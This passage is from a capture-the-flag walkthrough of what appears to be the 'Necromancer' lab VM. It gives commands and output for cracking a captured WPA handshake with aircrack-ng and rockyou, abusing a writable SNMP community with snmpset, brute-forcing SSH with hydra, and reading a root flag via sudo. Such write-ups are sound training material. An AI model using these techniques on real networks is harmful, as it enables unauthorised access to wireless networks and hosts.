<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nc -u 192.168.56.101 31337
</span><span class='line'>
</span><span class='line'>Nothing happens.
</span><span class='line'>blackmagic
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>As you chant the words, a hissing sound echoes from the ice walls.
</span><span class='line'>
</span><span class='line'>The blue aura disappears from the cave entrance.
</span><span class='line'>
</span><span class='line'>You enter the cave and see that it is dimly lit by torches; shadows dancing against the rock wall as you descend deeper and deeper into the mountain.
</span><span class='line'>
</span><span class='line'>You hear high pitched screeches coming from within the cave, and you start to feel a gentle breeze.
</span><span class='line'>
</span><span class='line'>The screeches are getting closer, and with it the breeze begins to turn into an ice cold wind.
</span><span class='line'>
</span><span class='line'>Suddenly, you are attacked by a swarm of bats!
</span><span class='line'>
</span><span class='line'>You aimlessly thrash at the air in front of you!
</span><span class='line'>
</span><span class='line'>The bats continue their relentless attack, until&hellip;. silence.
</span><span class='line'>
</span><span class='line'>Looking around you see no sign of any bats, and no indication of the struggle which had just occurred.
</span><span class='line'>
</span><span class='line'>Looking towards one of the torches, you see something on the cave wall.
</span><span class='line'>
</span><span class='line'>You walk closer, and notice a pile of mutilated bats lying on the cave floor.  Above them, a word etched in blood on the wall.
</span><span class='line'>
</span><span class='line'>/thenecromancerwillabsorbyoursoul
</span><span class='line'>
</span><span class='line'>flag5{0766c36577af58e15545f099a3b15e60}
</span></code></pre></td></tr></table></div></figure>
It provides another webpage link with a story and
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>flag6{b1c3ed8f1db4258e4dcb0ce565f6dc03}
</span><span class='line'>
</span><span class='line'>You continue to make your way through the cave.
</span><span class='line'>
</span><span class='line'>In the distance you can see a familiar flicker of light moving in and out of the shadows.
</span><span class='line'>
</span><span class='line'>As you get closer to the light you can hear faint footsteps, followed by the sound of a heavy door opening.
</span><span class='line'>
</span><span class='line'>You move closer, and then stop frozen with fear.
</span><span class='line'>
</span><span class='line'>It&rsquo;s the necromancer!
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Image copyright: Manzanedo
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Again he stares at you with deathly hollow eyes.
</span><span class='line'>
</span><span class='line'>He is standing in a doorway; a staff in one hand, and an object in the other.
</span><span class='line'>
</span><span class='line'>Smirking, the necromancer holds the staff and the object in the air.
</span><span class='line'>
</span><span class='line'>He points his staff in your direction, and the stench of death and decay begins to fill the air.
</span><span class='line'>
</span><span class='line'>You stare into his eyes and then&hellip;&hellip;.
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>&hellip;&hellip; darkness. You open your eyes and find yourself lying on the damp floor of the cave.
</span><span class='line'>
</span><span class='line'>The amulet must have saved you from whatever spell the necromancer had cast.
</span><span class='line'>
</span><span class='line'>You stand to your feet. Behind you, only darkness.
</span><span class='line'>
</span><span class='line'>Before you, a large door with the symbol of a skull engraved into the surface.
</span><span class='line'>
</span><span class='line'>Looking closer at the skull, you can see u161 engraved into the forehead.</span></code></pre></td></tr></table></div></figure>
Running file
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>file necromancer
</span><span class='line'>necromancer: bzip2 compressed data, block size = 900k
</span><span class='line'>
</span><span class='line'>tar -jxvf necromancer
</span><span class='line'>necromancer.cap
</span><span class='line'>
</span><span class='line'>file necromancer.cap
</span><span class='line'>necromancer.cap: tcpdump capture file (little-endian) - version 2.4 (802.11, capture length 65535)</span></code></pre></td></tr></table></div></figure>
Opening the necromancer.cap file, we find Authentication, Deauthentication and EAPOL data, which is similar to the packet capture when trying to do WPA-handshake capture, while trying to deauthenticate the valid user.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>13:06:21.922176 DeAuthentication (c4:12:f5:0d:5e:95 (oui Unknown)): Class 3 frame received from nonassociated station
</span><span class='line'>13:06:21.922688 DeAuthentication (c4:12:f5:0d:5e:95 (oui Unknown)): Class 3 frame received from nonassociated station
</span><span class='line'>13:06:21.923157 Acknowledgment RA:c4:12:f5:0d:5e:95 (oui Unknown)
</span><span class='line'>13:06:21.924224 DeAuthentication (e8:50:8b:20:52:75 (oui Unknown)): Class 3 frame received from nonassociated station
</span><span class='line'>13:06:21.924736 DeAuthentication (e8:50:8b:20:52:75 (oui Unknown)): Class 3 frame received from nonassociated station
</span><span class='line'>13:06:21.925723 Acknowledgment RA:e8:50:8b:20:52:75 (oui Unknown)
</span><span class='line'>13:06:21.933402 Probe Response (community) [1.0</em> 2.0<em> 5.5</em> 11.0<em> 18.0 24.0 36.0 54.0 Mbit] CH: 11, PRIVACY
</span><span class='line'>13:06:21.933908 Acknowledgment RA:c4:12:f5:0d:5e:95 (oui Unknown)
</span><span class='line'>13:06:21.934427 Clear-To-Send RA:e0:3e:44:04:52:75 (oui Unknown)
</span><span class='line'>13:06:21.991250 Authentication (Open System)-1: Successful
</span><span class='line'>13:06:21.992274 Authentication (Open System)-1: Successful
</span><span class='line'>13:06:21.992282 Acknowledgment RA:e8:50:8b:20:52:75 (oui Unknown)
</span><span class='line'>13:06:21.992795 Authentication (Open System)-2:
</span><span class='line'>13:06:21.992787 Acknowledgment RA:c4:12:f5:0d:5e:95 (oui Unknown)
</span><span class='line'>13:06:21.994834 Assoc Request (community) [1.0</em> 2.0<em> 5.5</em> 11.0* 18.0 24.0 36.0 54.0 Mbit]
</span><span class='line'>13:06:21.994843 Acknowledgment RA:e8:50:8b:20:52:75 (oui Unknown)
</span><span class='line'>13:06:21.996890 Assoc Response AID(1) : PRIVACY : Successful
</span><span class='line'>13:06:21.996882 Acknowledgment RA:c4:12:f5:0d:5e:95 (oui Unknown)
</span><span class='line'>13:06:22.011783 Action (e8:50:8b:20:52:75 (oui Unknown)): BA ADDBA Response
</span><span class='line'>13:06:22.012314 Acknowledgment RA:e8:50:8b:20:52:75 (oui Unknown)
</span><span class='line'>13:06:22.012827 BAR RA:e8:50:8b:20:52:75 (oui Unknown) TA:c4:12:f5:0d:5e:95 (oui Unknown) CTL(4) SEQ(0)
</span><span class='line'>13:06:22.013330 BA RA:c4:12:f5:0d:5e:95 (oui Unknown)
</span><span class='line'>13:06:22.014874 CF +QoS EAPOL key (3) v2, len 117
</span><span class='line'>13:06:22.015379 Acknowledgment RA:c4:12:f5:0d:5e:95 (oui Unknown)
</span><span class='line'>13:06:22.030226 CF +QoS EAPOL key (3) v1, len 117
</span><span class='line'>13:06:22.030746 Acknowledgment RA:e8:50:8b:20:52:75 (oui Unknown)
</span><span class='line'>13:06:22.043034 CF +QoS EAPOL key (3) v2, len 175
</span><span class='line'>13:06:22.043026 Acknowledgment RA:c4:12:f5:0d:5e:95 (oui Unknown)
</span><span class='line'>13:06:22.054803 CF +QoS EAPOL key (3) v1, len 95
</span><span class='line'>13:06:22.056338 CF +QoS EAPOL key (3) v1, len 95
</span><span class='line'>13:06:22.056859 Acknowledgment RA:e8:50:8b:20:52:75 (oui Unknown)
</span><span class='line'>13:06:22.064514 Acknowledgment RA:18:f6:43:9c:dc:5f (oui Unknown)
</span><span class='line'>13:06:22.065030 Acknowledgment RA:18:f6:43:9c:dc:5f (oui Unknown)
</span><span class='line'>13:06:22.079878 Clear-To-Send RA:18:f6:43:9c:dc:5f (oui Unknown)
</span><span class='line'>13:06:22.080901 Acknowledgment RA:18:f6:43:9c:dc:5f (oui Unknown)
</span><span class='line'>13:06:22.108096 DeAuthentication (c4:12:f5:0d:5e:95 (oui Unknown)): Class 3 frame received from nonassociated station
</span><span class='line'>13:06:22.108096 DeAuthentication (c4:12:f5:0d:5e:95 (oui Unknown)): Class 3 frame received from nonassociated station
</span><span class='line'>13:06:22.110144 DeAuthentication (e8:50:8b:20:52:75 (oui Unknown)): Class 3 frame received from nonassociated station
</span></code></pre></td></tr></table></div></figure></p>

<p>Aircrack-ng shows 1 WPA Handshake present
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ircrack-ng necromancer.cap
</span><span class='line'>Opening necromancer.cap
</span><span class='line'>Read 2197 packets.
</span><span class='line'>
</span><span class='line'>   #  BSSID              ESSID                     Encryption
</span><span class='line'>
</span><span class='line'>   1  C4:12:F5:0D:5E:95  community                 WPA (1 handshake)
</span><span class='line'>
</span><span class='line'>Choosing first network as target.
</span><span class='line'>
</span><span class='line'>Opening necromancer.cap
</span><span class='line'>Please specify a dictionary (option -w).
</span></code></pre></td></tr></table></div></figure>
Utilizing aircrack with rockyou provides the wpa key
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>                             Aircrack-ng 1.2 rc4
</span><span class='line'>
</span><span class='line'>  [00:00:09] 16092/9822768 keys tested (1749.59 k/s)
</span><span class='line'>
</span><span class='line'>  Time left: 1 hour, 33 minutes, 27 seconds                  0.16%
</span><span class='line'>
</span><span class='line'>                       KEY FOUND! [ death2all ]
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>  Master Key     : 7C F8 5B 00 BC B6 AB ED B0 53 F9 94 2D 4D B7 AC
</span><span class='line'>                   DB FA 53 6F A9 ED D5 68 79 91 84 7B 7E 6E 0F E7
</span><span class='line'>
</span><span class='line'>  Transient Key  : EB 8E 29 CE 8F 13 71 29 AF FF 04 D7 98 4C 32 3C
</span><span class='line'>                   56 8E 6D 41 55 DD B7 E4 3C 65 9A 18 0B BE A3 B3
</span><span class='line'>                   C8 9D 7F EE 13 2D 94 3C 3F B7 27 6B 06 53 EB 92
</span><span class='line'>                   3B 10 A5 B0 FD 1B 10 D4 24 3C B9 D6 AC 23 D5 7D
</span><span class='line'>
</span><span class='line'>  EAPOL HMAC     : F6 E5 E2 12 67 F7 1D DC 08 2B 17 9C 72 42 71 8E </span></code></pre></td></tr></table></div></figure></p>

<p>If we read the message previously, it says, u161 is engraved into your forehead. Using snmpwalk to findout.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>snmp-check -t 192.168.56.101 -c death2all
</span><span class='line'>
</span><span class='line'> [<em>] System information
</span><span class='line'> &mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;
</span><span class='line'>
</span><span class='line'> Hostname               : Fear the Necromancer!
</span><span class='line'> Description            : You stand in front of a door.
</span><span class='line'> Uptime system          : 0.00 seconds
</span><span class='line'> Uptime SNMP daemon     : 0.00 seconds
</span><span class='line'> Contact                : The door is Locked. If you choose to defeat me, the door must be Unlocked.
</span><span class='line'> Location               : Locked - death2allrw!
</span><span class='line'> Motd                   : -</span></code></pre></td></tr></table></div></figure>
Checking for write access with death2all and death2allrw
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>snmp-check -t 192.168.56.101 -c death2all -w
</span><span class='line'>snmpcheck v1.8 - SNMP enumerator
</span><span class='line'> [</em>] Try to connect to 192.168.56.101
</span><span class='line'> [<em>] Connected to 192.168.56.101
</span><span class='line'> [</em>] Starting enumeration at 2016-07-16 17:27:43
</span><span class='line'> [<em>] No write access enabled.
</span><span class='line'> [</em>] Checked 192.168.56.101 in 0.00 seconds
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>snmp-check -t 192.168.56.101 -c death2allrw -w
</span><span class='line'>snmpcheck v1.8 - SNMP enumerator
</span><span class='line'>Copyright &copy; 2005-2011 by Matteo Cantoni (www.nothink.org)
</span><span class='line'>
</span><span class='line'> [<em>] Try to connect to 192.168.56.101
</span><span class='line'> [</em>] Connected to 192.168.56.101
</span><span class='line'> [<em>] Starting enumeration at 2016-07-16 17:27:55
</span><span class='line'> [</em>] Write access enabled!
</span><span class='line'> [*] Checked 192.168.56.101 in 0.00 seconds</span></code></pre></td></tr></table></div></figure>
Write access is enabled, we can use snmpset
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>snmpwalk -c death2all -v 1 192.168.56.101
</span><span class='line'>iso.3.6.1.2.1.1.1.0 = STRING: &ldquo;You stand in front of a door.&rdquo;
</span><span class='line'>iso.3.6.1.2.1.1.4.0 = STRING: &ldquo;HASH(0x286cfd0)&rdquo;
</span><span class='line'>iso.3.6.1.2.1.1.5.0 = STRING: &ldquo;Fear the Necromancer!&rdquo;
</span><span class='line'>iso.3.6.1.2.1.1.6.0 = STRING: &ldquo;Locked - death2allrw!&rdquo;
</span><span class='line'>End of MIB</span></code></pre></td></tr></table></div></figure>
We need to change the iso.3.6.1.2.1.1.6.0 MIB from &ldquo;Locked - death2allrw!&rdquo; to &ldquo;Unlocked&rdquo;
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>snmpset -c death2allrw -v 1 192.168.56.101 iso.3.6.1.2.1.1.6.0 s &ldquo;Unlocked&rdquo;
</span><span class='line'>iso.3.6.1.2.1.1.6.0 = STRING: &ldquo;Unlocked&rdquo;</span></code></pre></td></tr></table></div></figure>
Running snmpwalk again with community string death2all
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>snmpwalk -c death2all -v 1 192.168.56.101
</span><span class='line'>iso.3.6.1.2.1.1.1.0 = STRING: &ldquo;You stand in front of a door.&rdquo;
</span><span class='line'>iso.3.6.1.2.1.1.4.0 = STRING: &ldquo;The door is unlocked! You may now enter the Necromancer&rsquo;s lair!&rdquo;
</span><span class='line'>iso.3.6.1.2.1.1.5.0 = STRING: &ldquo;Fear the Necromancer!&rdquo;
</span><span class='line'>iso.3.6.1.2.1.1.6.0 = STRING: &ldquo;flag7{9e5494108d10bbd5f9e7ae52239546c4} - t22&rdquo;</span></code></pre></td></tr></table></div></figure>
Checking the google for 9e5494108d10bbd5f9e7ae52239546c4 leads to demonslayer, combined with the hint of t22 which is tcp 22/ ssh. we try to login using hydra and rockyou dictionary.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>hydra -l demonslayer -P /tmp/rockyou.txt ssh://192.168.56.101
</span><span class='line'>Hydra v8.2 &copy; 2016 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
</span><span class='line'>
</span><span class='line'>Hydra (<a href="http://www.thc.org/thc-hydra">http://www.thc.org/thc-hydra</a>) starting at 2016-07-16 17:38:09
</span><span class='line'>[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
</span><span class='line'>[DATA] max 16 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~14008 tries per task
</span><span class='line'>[DATA] attacking service ssh on port 22
</span><span class='line'>[22][ssh] host: 192.168.56.101   login: demonslayer   password: 12345678
</span><span class='line'>1 of 1 target successfully completed, 1 valid password found
</span><span class='line'>Hydra (<a href="http://www.thc.org/thc-hydra">http://www.thc.org/thc-hydra</a>) finished at 2016-07-16 17:38:12</span></code></pre></td></tr></table></div></figure>
It provides the password superfast.</p>

<p>Loggin in to view another flag
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ id
</span><span class='line'>uid=1000(demonslayer) gid=1000(demonslayer) groups=1000(demonslayer)
</span><span class='line'>$ ls
</span><span class='line'>flag8.txt
</span><span class='line'>$ cat flag8.txt                                                                                                                                                                                                               <br/>
</span><span class='line'>You enter the Necromancer&rsquo;s Lair!
</span><span class='line'>
</span><span class='line'>A stench of decay fills this place.<br/>
</span><span class='line'>
</span><span class='line'>Jars filled with parts of creatures litter the bookshelves.
</span><span class='line'>
</span><span class='line'>A fire with flames of green burns coldly in the distance.
</span><span class='line'>
</span><span class='line'>Standing in the middle of the room with his back to you is the Necromancer.<br/>
</span><span class='line'>
</span><span class='line'>In front of him lies a corpse, indistinguishable from any living creature you have seen before.
</span><span class='line'>
</span><span class='line'>He holds a staff in one hand, and the flickering object in the other.
</span><span class='line'>
</span><span class='line'>&ldquo;You are a fool to follow me here!  Do you not know who I am!&rdquo;
</span><span class='line'>
</span><span class='line'>The necromancer turns to face you.  Dark words fill the air!
</span><span class='line'>
</span><span class='line'>&ldquo;You are damned already my friend.  Now prepare for your own death!&rdquo;
</span><span class='line'>
</span><span class='line'>Defend yourself!  Counter attack the Necromancer&rsquo;s spells at u777!</span></code></pre></td></tr></table></div></figure>
On connecting the udp port 777 from the ssh session
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ nc -u localhost 777
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><strong> You only have 3 hitpoints left! </strong>
</span><span class='line'>
</span><span class='line'>Defend yourself from the Necromancer&rsquo;s Spells!
</span><span class='line'>
</span><span class='line'>Where do the Black Robes practice magic of the Greater Path?  Kelewan
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>flag8{55a6af2ca3fee9f2fef81d20743bda2c}
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><strong> You only have 3 hitpoints left! </strong>
</span><span class='line'>
</span><span class='line'>Defend yourself from the Necromancer&rsquo;s Spells!
</span><span class='line'>
</span><span class='line'>Who did Johann Faust VIII make a deal with?  Mephistopheles
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>flag9{713587e17e796209d1df4c9c2c2d2966}
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><strong> You only have 3 hitpoints left! </strong>
</span><span class='line'>
</span><span class='line'>Defend yourself from the Necromancer&rsquo;s Spells!
</span><span class='line'>
</span><span class='line'>Who is tricked into passing the Ninth Gate?  Hedge
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>flag10{8dc6486d2c63cafcdc6efbba2be98ee4}
</span><span class='line'>
</span><span class='line'>A great flash of light knocks you to the ground; momentarily blinding you!
</span><span class='line'>
</span><span class='line'>As your sight begins to return, you can see a thick black cloud of smoke lingering where the Necromancer once stood.
</span><span class='line'>
</span><span class='line'>An evil laugh echoes in the room and the black cloud begins to disappear into the cracks in the floor.
</span><span class='line'>
</span><span class='line'>The room is silent.
</span><span class='line'>
</span><span class='line'>You walk over to where the Necromancer once stood.
</span><span class='line'>
</span><span class='line'>On the ground is a small vile</span></code></pre></td></tr></table></div></figure>
Finding the small vile with the ls -lah
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cat .smallvile                                                                                                                                                                                                              <br/>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>You pick up the small vile.
</span><span class='line'>
</span><span class='line'>Inside of it you can see a green liquid.
</span><span class='line'>
</span><span class='line'>Opening the vile releases a pleasant odour into the air.
</span><span class='line'>
</span><span class='line'>You drink the elixir and feel a great power within your veins!
</span><span class='line'>
</span><span class='line'>
</span></code></pre></td></tr></table></div></figure>
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sudo -l
</span><span class='line'>Matching Defaults entries for demonslayer on thenecromancer:
</span><span class='line'>    env_keep+=&ldquo;FTPMODE PKG_CACHE PKG_PATH SM_PATH SSH_AUTH_SOCK&rdquo;
</span><span class='line'>
</span><span class='line'>User demonslayer may run the following commands on thenecromancer:
</span><span class='line'>    (ALL) NOPASSWD: /bin/cat /root/flag11.txt
</span><span class='line'>$ sudo cat /root/flag11.txt
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Suddenly you feel dizzy and fall to the ground!
</span><span class='line'>
</span><span class='line'>As you open your eyes you find yourself staring at a computer screen.
</span><span class='line'>
</span><span class='line'>Congratulations!!! You have conquered&hellip;&hellip;
</span><span class='line'>
</span><span class='line'>          .                                                      .
</span><span class='line'>        .n                   .                 .                  n.
</span><span class='line'>  .   .dP                  dP                   9b                 9b.    .
</span><span class='line'> 4    qXb         .       dX                     Xb       .        dXp     t
</span><span class='line'>dX.    9Xb      .dXb    <strong>                         </strong>    dXb.     dXP     .Xb
